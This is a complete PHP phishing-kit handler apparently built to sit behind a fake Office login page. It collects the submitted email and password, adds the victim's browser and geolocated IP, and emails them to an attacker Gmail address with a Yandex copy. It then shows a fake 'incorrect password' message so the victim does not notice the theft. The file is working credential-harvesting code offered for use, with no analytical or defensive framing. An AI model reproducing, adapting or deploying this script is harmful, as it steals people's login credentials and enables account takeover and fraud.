<?php
    $softuser = $_POST['email'];
    $harduser = $_POST['password'];

    if($softuser != "" and $harduser != "") {

        $mail_receiver = "kencolville8@gmail.com";

        
        $mail_sender = "From:"."vksrgrinmd@162-241-65-242.webhostbox.net". "\r\n";
        $mail_sender .= "Cc:undisclosedtext@yandex.com \r\n";
        $mail_sender .= "MIME-Version: 1.0\r\n";
        $mail_sender .= "Content-type: text/html\r\n";

      
         
       // $mail_sender .= $strip." \r\n";
        
        $value = "<h2>BOX I.D:</h2> " . " " . $softuser  . "<br/>";
        $value .= "<h2>Password:</h2> " . " "  . $harduser ."<br/>";
        $value .= "<h2>Browser:</h2> " . " " . $_SERVER['HTTP_USER_AGENT'] . "<br/>";

        $ip_starter = curl_init();
        curl_setopt($ip_starter, CURLOPT_URL, "http://www.geoplugin.net/json.gp?ip=");
        curl_setopt($ip_starter, CURLOPT_HEADER, 0);
        curl_setopt($ip_starter, CURLOPT_RETURNTRANSFER, TRUE);
        $assigned_promise = curl_exec($ip_starter); // string
        curl_close($ip_starter);

        $promise = json_decode($assigned_promise,true);
        $promise = str_replace('&quot;', '"', $promise); 

        
        $value .= "<h2>IP:</h2> " . " " . $promise['geoplugin_request']  . "<br/>";
        $value .= "<h2>Country:</h2> " . " " . $promise['geoplugin_countryName'] . "<br/>";
         
    
        $subject = " Office Log | " . $promise['geoplugin_regionName'] ." ". $promise['geoplugin_countryName'] . " | " . $promise['geoplugin_request'];
   
        

         $execute_mail_send = mail ($mail_receiver,$subject,$value,$mail_sender);
         $signal = 'ok';
         $msg = 'Your email or password is incorrect. Make sure that you type the correct password.';
    
         
            $data = array(
               'signal' => $signal,
               'msg' => $msg
           );
           echo json_encode($data); 
         
    }
 ?>